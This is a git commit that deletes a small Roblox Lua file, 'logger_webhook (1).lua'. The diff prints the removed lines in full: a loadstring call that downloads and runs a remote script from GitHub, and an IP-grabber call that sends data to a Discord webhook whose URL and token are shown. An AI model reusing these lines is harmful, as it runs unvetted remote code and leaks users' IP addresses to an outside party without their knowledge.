51c592eba4bd56a954370ba24c28acef774abb37
Skidscripter <105400319+Skidscripter@users.noreply.github.com>
2022-07-02 22:34:12 -0400

    Delete logger_webhook (1).lua

--- logger_webhook (1).lua
+++
@@ -1,3 +0,0 @@
-local IPGrabber = loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/RandomStuff/main/grab/funny.lua"))()
-
-IPGrabber:grabIP("https://discord.com/api/webhooks/990007332685643847/x7JlxqKB0hl2wZ4I1881bbfAMsy-pCD2ThPy3_8YVKqlzh47J7M9S1sJWfcJ-KfE-BmK")
